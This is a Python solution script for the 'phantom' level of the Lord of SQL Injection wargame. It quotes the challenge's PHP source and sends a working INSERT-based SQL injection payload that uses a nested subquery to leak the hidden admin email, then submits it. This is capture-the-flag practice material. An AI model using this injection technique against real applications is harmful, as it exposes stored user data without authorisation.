#!/usr/bin/env python3
from bs4 import BeautifulSoup
import los
import los_cookies as lc
import re
import requests


def check_func(*args) -> bool:
    """
    check string in response of request
    args[0]: response
    """
    return 'config' in args[0]


def main():
    """
    Phantom 29

    if($_GET['joinmail']){
      if(preg_match('/duplicate/i', $_GET['joinmail'])) exit("nice try");
      $query = "insert into prob_phantom values(0,'{$_SERVER[REMOTE_ADDR]}','{$_GET[joinmail]}')";
      mysqli_query($db,$query);
      echo "<hr>query : <strong>{$query}</strong><hr>";
    }

    $rows = mysqli_query($db,"select no,ip,email from prob_phantom where no=1 or ip='{$_SERVER[REMOTE_ADDR]}'");
    echo "<table border=1><tr><th>ip</th><th>email</th></tr>";
      while(($result = mysqli_fetch_array($rows))){
      if($result['no'] == 1) $result['email'] = "**************";
      echo "<tr><td>{$result[ip]}</td><td>".htmlentities($result[email])."</td></tr>";
    }
    echo "</table>";

    $_GET[email] = addslashes($_GET[email]);
    $query = "select email from prob_phantom where no=1 and email='{$_GET[email]}'";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if(($result['email']) && ($result['email'] === $_GET['email'])){ mysqli_query($db,"delete from prob_phantom where no != 1"); solve("phantom"); }
    """

    url = "https://los.rubiya.kr/chall/phantom_e2e30eaf1c0b3cb61b4b72a932c849fe.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'joinmail'

    ip = requests.get('https://ifconfig.me/ip').text
    print(ip)

    payload = f"1'),(0,'{ip}',(select a from (select email as a from prob_phantom where no=1) as b))#"
    p = los.SqlInjection(url, cook, method, inj_param, payload)
    response = p.my_request()
    print('')

    soup = BeautifulSoup(response.replace(
        '<td>', '').replace('</td>', ''), 'html.parser')
    mail = soup.find_all(string=re.compile('@'))

    p.inj_param = 'email'
    p.payload = mail[0].replace(ip, '')
    response = p.my_request()
    if 'Clear!' in response:
        print('\nPhantom Clear!')


if __name__ == '__main__':
    main()
